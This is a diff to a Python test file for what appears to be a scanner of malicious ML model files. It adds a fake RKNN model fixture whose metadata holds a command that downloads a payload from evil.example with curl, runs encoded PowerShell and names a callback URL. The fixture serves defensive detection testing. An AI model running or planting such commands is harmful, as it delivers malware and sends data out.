@@ -117,6 +117,14 @@ def _build_malicious_lightgbm() -> bytes:
     )
 
 
+def _build_malicious_rknn() -> bytes:
+    return (
+        b"RKNN\x01\x00\x00\x00"
+        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
+        b"callback=http://198.51.100.5:8080/collect\n"
+    )
+
+
 def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
     """Write a ZIP archive at an intentionally misleading file path."""
     with zipfile.ZipFile(path, "w") as archive:
@@ -1888,7 +1896,11 @@ def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Pat
 
 @pytest.mark.parametrize(
     ("scanner_name", "payload"),
-    [("cntk", _build_malicious_cntkv2()), ("lightgbm", _build_malicious_lightgbm())],
+    [
+        ("cntk", _build_malicious_cntkv2()),
+        ("lightgbm", _build_malicious_lightgbm()),
+        ("rknn", _build_malicious_rknn()),
+    ],
 )
 def test_scan_file_detects_malicious_renamed_signature_backed_models(
     tmp_path: Path,
